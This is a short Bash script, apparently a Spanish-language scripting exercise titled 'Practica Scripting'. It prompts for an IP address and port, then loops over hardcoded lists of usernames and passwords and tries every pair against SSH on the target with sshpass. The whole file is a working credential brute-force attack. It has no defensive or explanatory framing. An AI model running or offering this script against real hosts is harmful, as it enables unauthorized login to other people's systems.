# Practica Scripting

#!/bin/bash
echo "Dime la ip"
read ip
echo "Dime el puerto"
read port
listaNombres=("eloy" "Admin" "usuario" "Usuario" "pc" "PC")
listaPass=("lui1" "admin" "admin1234" "PEnt2001.")
numNombres=${#listaNombres[@]}
numPass=${#listaPass[@]}
for ((i=0; i<$numNombres; i++ ))
do
        for((j=0; j<$numPass; j++ ))
        do
        sshpass -p "${listaPass[$j]}" ssh -p "$port" "${listaNombres[$i]}@$ip"
        done
done
